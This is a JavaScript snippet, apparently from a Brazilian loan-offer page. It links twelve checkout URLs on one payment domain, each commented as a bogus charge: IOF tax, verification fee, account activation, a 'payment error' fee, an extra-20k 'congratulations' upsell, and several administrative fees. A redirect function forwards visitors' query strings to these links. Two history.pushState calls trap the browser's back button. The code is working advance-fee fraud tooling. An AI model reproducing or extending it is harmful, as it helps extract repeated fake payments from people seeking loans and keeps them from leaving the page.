const baseLinks = {
    up1: "https://pay.marktplaceseguro.online/c/768b0af0-2bb9-492c-8bbc-b72b3fc1e25a", // IOF
    up2: "https://pay.marktplaceseguro.online/c/9be8fbb4-bbc8-4beb-86f8-855b02ce9120", // Taxa de verificação de IOF
    up3: "https://pay.marktplaceseguro.online/c/bcb5f34c-2eef-4628-b33a-67b4612724eb", // Seguro Prestamista "tarifa de cadastro"
    up4: "https://pay.marktplaceseguro.online/c/4bc29201-658a-4a21-88ab-3e23cb6d859f", // NFe
    up5: "https://pay.marktplaceseguro.online/c/76bb27bf-4de3-4e6a-aaa1-4f07724b303d", // Ativar conta
    up6: "https://pay.marktplaceseguro.online/c/838291c1-9210-4485-aa55-e38533b8f552", // Taxa de registro do contrato
    up7: "https://pay.marktplaceseguro.online/c/02936032-1118-45f0-a425-dd59a1ca757b", // Parabéns, 20k adicional
    up8: "https://pay.marktplaceseguro.online/c/24af4f0b-8c78-4a5b-9419-deff0dc3cae1", // Erro no pagamento - 14,06
    up9: "https://pay.marktplaceseguro.online/c/6681245a-1ee5-4140-8125-6b3888c0ccd3", // APP - 11,99
    up10:"https://pay.marktplaceseguro.online/c/676ad1c6-e04f-40b9-a148-6f53a8882a02", // Taxa de Abertura TAC - 16,92
    up11:"https://pay.marktplaceseguro.online/c/89bcbd4b-72ad-45d9-a3bc-065ee58bab80", // Taxa de Consultoria Financeira - 19,53
    up12:"https://pay.marktplaceseguro.online/c/9be8fbb4-bbc8-4beb-86f8-855b02ce9120" // Taxa de Processamento Administrativo - 31,92

};

function redirect(key) {
    try {
        if (!baseLinks[key]) {
            throw new Error(`Link para ${key} não encontrado!`);
        }

        const url = new URL(baseLinks[key]);
        url.search = new URLSearchParams(window.location.search).toString();

        window.location.href = url.href;
        
    } catch (error) {
        console.error('Erro no redirecionamento:', error);
        alert(`Erro: ${error.message || "Não foi possível redirecionar"}`);
    }
}

// Adiciona duas entradas no histórico para capturar a navegação para trás
history.pushState({}, '', location.href);
history.pushState({}, '', location.href);

